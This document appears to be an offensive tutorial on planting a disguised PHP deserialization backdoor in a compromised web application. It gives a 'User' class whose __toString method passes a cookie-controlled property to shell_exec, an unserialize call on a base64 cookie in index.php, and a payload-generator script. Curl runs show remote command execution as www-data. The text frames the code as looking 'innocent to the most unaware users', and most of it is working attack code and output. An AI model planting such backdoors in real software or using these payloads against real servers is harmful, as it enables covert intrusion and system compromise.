# PHP Object Deserialization

The `PHP Object Deserialization` is not exactly a backdooring technique but it's rather a real vulnerability.
So in scenarios where a `PHP Object Deserialization` is already present, it can be exploited for achieving `LFI`, `Arbitrary File Read`, `RFI` and in worse cases `RCE`.
In this example, we'll use the PHP deserialization mechanism to modify some source codes of compromised machine adding some code that looks innocent to the most unaware users, but actually it's a backdoor for achieving `RCE`.

More info about deserialization can be found at: https://www.php.net/manual/it/language.oop5.serialization.php

Let's suppose we have a class of the application called `User` which defines its own methods and instance variables.
We add an instance variable called `cmd` and we add the `__toString()` methos (or only the body of the function if it's already declared). Note that other magic methods can be used of course.
The file will contain a script like this (`manage.php`)

```php
<?php

class User {
    private $cmd;

    public function __construct() {
        if (isset($_COOKIE['PHPSESSID'])) {
            $this->cmd = "cat /tmp/sess_" . $_COOKIE['PHPSESSID'];
        }
    }

    // returns info about the current user session
    public function __toString()
    {
        return (string) ($this->cmd !== null ? print_r(shell_exec($this->cmd)) : '');
    }
}
?>
```

This code appears to be more complex than necessary for retrieving the content of the current user session. But at the end, it looks innocent. Eventually, this code can leak sensitive information already but that's another story.

Now let's assume that in our `index.php` (or whatever script which already imports our `manage.php`) we add some more lines:


```php

<?php
// ... previous code
// require_once("manage.php"); // uncomment if not already imported by the current script

$obj = isset($_COOKIE['param']) ? unserialize(base64_decode($_COOKIE['param'])) : new User();

if (isset($_GET['debug'])){
    echo $obj;
}
?>
```

> [!NOTE]
>
> You don't need to `echo` the object if it is echoed from somewhere else. The important thing is that `__toString` will be
> executed for a reason or another. You don't even need to `unserialize` it if `unserialize` of such object is already present
> in some other places of the application.

This allows us to add a cookie param containing the custom command that we want to execute.
To obtain a valid `param` cookie we can use a script like this

```php
<?php

class User {
    private $cmd;

    public function __construct($cmdArg) {
        $this->cmd = $cmdArg;
    }
}

echo base64_encode(serialize(new User($argv[1])));

?>
```


# Exploit the backdoor

```bash
❯ curl http://localhost:8080/?debug -H 'Cookie: PHPSESSID=test'
1

❯ php exploit.php 'whoami' | xargs -I {} curl http://localhost:8080/?debug -H 'Cookie: param={}'
www-data
1

❯ php exploit.php 'id' | xargs -I {} curl http://localhost:8080/?debug -H 'Cookie: param={}'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
1
```